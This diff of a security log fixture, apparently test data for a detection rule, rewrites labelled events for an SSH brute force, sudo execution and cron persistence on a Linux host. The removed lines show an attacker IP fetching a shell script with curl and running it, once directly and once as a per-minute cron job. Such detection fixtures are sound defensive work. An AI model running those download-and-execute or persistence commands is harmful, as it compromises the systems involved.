@@ -1,10 +1,22 @@
-Time|Host|User|EventType|SourceIP|Command|Result|Case
-09:00:01|linux-01|alice|SSH_ACCEPTED|198.51.100.20|-|SUCCESS|BENIGN_ADMIN
-09:05:00|linux-02|backup|SUDO|10.0.0.10|/usr/bin/rsync backup|SUCCESS|BENIGN_BACKUP
-09:10:00|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
-09:10:10|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
-09:10:20|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
-09:10:35|linux-33|root|SSH_ACCEPTED|203.0.113.90|-|SUCCESS|LINUX_ATTACK
-09:11:00|linux-33|root|SUDO|203.0.113.90|/bin/bash -c 'curl http://203.0.113.90/a.sh -o /tmp/a.sh && sh /tmp/a.sh'|SUCCESS|LINUX_ATTACK
-09:11:40|linux-33|root|CRON_CREATE|203.0.113.90|* * * * * curl http://203.0.113.90/p.sh -o /tmp/p.sh && sh /tmp/p.sh|SUCCESS|LINUX_ATTACK
-09:30:00|linux-04|dev|SSH_FAILED|198.51.100.30|-|FAILED|BENIGN_MISTYPE
+event_time|case_id|event_type|host|user|source_ip|destination_ip|process_name|parent_process_name|command_line|url|domain|action|result|auth_method|rule_context
+2026-06-24T09:00:01|BENIGN_ADMIN|authentication|linux-01|alice|198.51.100.20|-|sshd|-|-|-|-|login|success|ssh|known_admin_source
+2026-06-24T09:05:00|BENIGN_BACKUP|privilege_escalation|linux-02|backup|10.0.0.10|-|sudo|sshd|/usr/bin/rsync backup|-|-|execute|success|-|approved_automation
+2026-06-24T09:10:00|LINUX_ATTACK|authentication|linux-33|root|203.0.113.90|-|sshd|-|-|-|-|login|failure|ssh|external_source
+2026-06-24T09:10:10|LINUX_ATTACK|authentication|linux-33|root|203.0.113.90|-|sshd|-|-|-|-|login|failure|ssh|external_source
+2026-06-24T09:10:20|LINUX_ATTACK|authentication|linux-33|root|203.0.113.90|-|sshd|-|-|-|-|login|failure|ssh|external_source
+2026-06-24T09:10:35|LINUX_ATTACK|authentication|linux-33|root|203.0.113.90|-|sshd|-|-|-|-|login|success|ssh|external_source
+2026-06-24T09:11:00|LINUX_ATTACK|privilege_escalation|linux-33|root|203.0.113.90|-|sudo|sshd|sudo systemctl status|-|-|execute|success|-|post_authentication
+2026-06-24T09:11:40|LINUX_ATTACK|persistence|linux-33|root|203.0.113.90|-|cron|sudo|create scheduled job|-|-|create|success|-|new_scheduled_job
+2026-06-24T09:30:00|BENIGN_MISTYPE|authentication|linux-04|dev|198.51.100.30|-|sshd|-|-|-|-|login|failure|ssh|known_user_source
+2026-06-24T10:00:00|NEAR_MISS_THRESHOLD|authentication|linux-05|tester|198.51.100.50|-|sshd|-|-|-|-|login|failure|ssh|test_source
+2026-06-24T10:00:10|NEAR_MISS_THRESHOLD|authentication|linux-05|tester|198.51.100.50|-|sshd|-|-|-|-|login|failure|ssh|test_source
+2026-06-24T10:00:20|NEAR_MISS_THRESHOLD|authentication|linux-05|tester|198.51.100.50|-|sshd|-|-|-|-|login|success|ssh|test_source
+2026-06-24T10:00:30|NEAR_MISS_THRESHOLD|privilege_escalation|linux-05|tester|198.51.100.50|-|sudo|sshd|sudo systemctl status|-|-|execute|success|-|post_authentication
+2026-06-24T10:00:40|NEAR_MISS_THRESHOLD|persistence|linux-05|tester|198.51.100.50|-|cron|sudo|create scheduled job|-|-|create|success|-|new_scheduled_job
+2026-06-24T11:00:00|OUT_OF_WINDOW|authentication|linux-06|tester|198.51.100.60|-|sshd|-|-|-|-|login|failure|ssh|test_source
+2026-06-24T11:00:10|OUT_OF_WINDOW|authentication|linux-06|tester|198.51.100.60|-|sshd|-|-|-|-|login|failure|ssh|test_source
+2026-06-24T11:00:20|OUT_OF_WINDOW|authentication|linux-06|tester|198.51.100.60|-|sshd|-|-|-|-|login|failure|ssh|test_source
+2026-06-24T11:00:30|OUT_OF_WINDOW|authentication|linux-06|tester|198.51.100.60|-|sshd|-|-|-|-|login|success|ssh|test_source
+2026-06-24T11:01:00|OUT_OF_WINDOW|privilege_escalation|linux-06|tester|198.51.100.60|-|sudo|sshd|sudo systemctl status|-|-|execute|success|-|post_authentication
+2026-06-24T11:04:00|OUT_OF_WINDOW|persistence|linux-06|tester|198.51.100.60|-|cron|sudo|create scheduled job|-|-|create|success|-|new_scheduled_job
+2026-06-24T12:00:00|KEYWORD_ONLY_COMMANDS|application_log|linux-07|reader|192.0.2.77|-|viewer|-|documentation mentions SSH_FAILED SUDO CRON_CREATE curl wget|-|-|observe|success|-|documentation
